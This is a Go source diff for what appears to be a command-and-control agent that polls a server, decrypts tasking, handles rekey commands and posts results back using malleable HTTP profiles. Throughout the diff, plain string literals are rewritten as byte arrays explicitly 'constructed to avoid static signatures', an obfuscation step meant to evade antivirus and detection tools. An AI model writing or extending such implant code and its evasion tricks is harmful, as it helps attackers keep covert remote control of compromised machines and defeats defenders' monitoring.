@@ -23,15 +23,21 @@ import (
 	"time"
 )
 
-// MALLEABLE_REKEY_COMMAND is the customizable rekey command value
-// This will be replaced at compile time via -ldflags
-var MALLEABLE_REKEY_COMMAND = "rekey_required"
+// Polling strings (constructed to avoid static signatures)
+var (
+	pollContentTypeJson  = string([]byte{0x61, 0x70, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x2f, 0x6a, 0x73, 0x6f, 0x6e})                   // application/json
+	pollStatusKey        = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                                               // status
+	pollCmdRekey         = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79})                                                                                     // rekey
+	pollStatusNoCommands = string([]byte{0x6e, 0x6f, 0x5f, 0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x73})                                                 // no_commands
+)
 
-// Malleable JSON field names for rekey response
-// These will be replaced at compile time via -ldflags
-var MALLEABLE_REKEY_STATUS_FIELD = "status"
-var MALLEABLE_REKEY_DATA_FIELD = "data"
-var MALLEABLE_REKEY_ID_FIELD = "command_db_id"
+// Malleable field values (constructed to avoid static signatures)
+var (
+	MALLEABLE_REKEY_COMMAND      = string([]byte{0x72, 0x65, 0x6b, 0x65, 0x79, 0x5f, 0x72, 0x65, 0x71, 0x75, 0x69, 0x72, 0x65, 0x64})             // rekey_required
+	MALLEABLE_REKEY_STATUS_FIELD = string([]byte{0x73, 0x74, 0x61, 0x74, 0x75, 0x73})                                                             // status
+	MALLEABLE_REKEY_DATA_FIELD   = string([]byte{0x64, 0x61, 0x74, 0x61})                                                                         // data
+	MALLEABLE_REKEY_ID_FIELD     = string([]byte{0x63, 0x6f, 0x6d, 0x6d, 0x61, 0x6e, 0x64, 0x5f, 0x64, 0x62, 0x5f, 0x69, 0x64})                   // command_db_id
+)
 
 // PollConfig holds the configuration for polling behavior
 type PollConfig struct {
@@ -99,7 +105,7 @@ func tryDecryptResponse(rawResponse map[string]interface{}, xorKey []byte) (map[
 		}
 
 		// Check if it has expected fields (status is required)
-		if _, hasStatus := response["status"]; hasStatus {
+		if _, hasStatus := response[pollStatusKey]; hasStatus {
 			return response, nil
 		}
 	}
@@ -138,9 +144,9 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 	}
 
 	// Get the custom POST method from decrypted values
-	method := decryptedValues["POST Method"]
+	method := decryptedValues[geKeyPostMethod]
 	if method == "" {
-		method = "POST" // Fallback to default
+		method = geMethodPost // Fallback to default
 	}
 
 	// Create request with custom method
@@ -149,8 +155,8 @@ func sendResults(encryptedData string, customHeaders map[string]string) error {
 		return fmt.Errorf(ErrCtx(E12, err.Error()))
 	}
 
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", decryptedValues["User Agent"])
+	req.Header.Set(httpHeaderContentType, pollContentTypeJson)
+	req.Header.Set(httpHeaderUserAgent, decryptedValues[geKeyUserAgent])
 	for key, value := range customHeaders {
 		req.Header.Set(key, value)
 	}
@@ -187,9 +193,9 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	decryptedValues := handshakeManager.decryptedValues
 
 	// Get the custom GET method from decrypted values
-	method := decryptedValues["GET Method"]
+	method := decryptedValues[geKeyGetMethod]
 	if method == "" {
-		method = "GET" // Fallback to default
+		method = geMethodGet // Fallback to default
 	}
 
 	// Create the request with custom method
@@ -199,7 +205,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	}
 
 	// Set headers
-	req.Header.Set("User-Agent", decryptedValues["User Agent"])
+	req.Header.Set(httpHeaderUserAgent, decryptedValues[geKeyUserAgent])
 	for key, value := range customHeaders {
 		req.Header.Set(key, value)
 	}
@@ -304,7 +310,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 		// Create result for the rekey command first (before triggering rekey)
 		rekeyResult := &CommandResult{
 			Command: Command{
-				Command:     "rekey",
+				Command:     pollCmdRekey,
 				CommandDBID: commandDBID,
 				AgentID:     clientID,
 			},
@@ -337,7 +343,7 @@ func doPoll(secureComms *SecureComms, customHeaders map[string]string) error {
 	}
 
 	// Check for no commands
-	if responseStatus == "no_commands" {
+	if responseStatus == pollStatusNoCommands {
 		return nil
 	}
 
@@ -403,7 +409,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 	if secureComms == nil {
 		// Fallback to creating new one if not available (shouldn't happen)
 		secureComms = NewSecureComms(
-			handshakeManager.decryptedValues["Secret"],
+			handshakeManager.decryptedValues[geKeySecret],
 			sysInfo.AgentInfo.Seed,
 		)
 	}
@@ -416,7 +422,7 @@ func startPolling(config PollConfig, sysInfo *SystemInfoReport) error {
 	r := rand.New(rand.NewSource(time.Now().UnixNano()))
 
 	// Parse custom headers from handshakeManager
-	customHeaders, err := parseCustomHeaders(handshakeManager.decryptedValues["Custom Headers"])
+	customHeaders, err := parseCustomHeaders(handshakeManager.decryptedValues[geKeyCustomHeaders])
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E18, err.Error()))
 	}
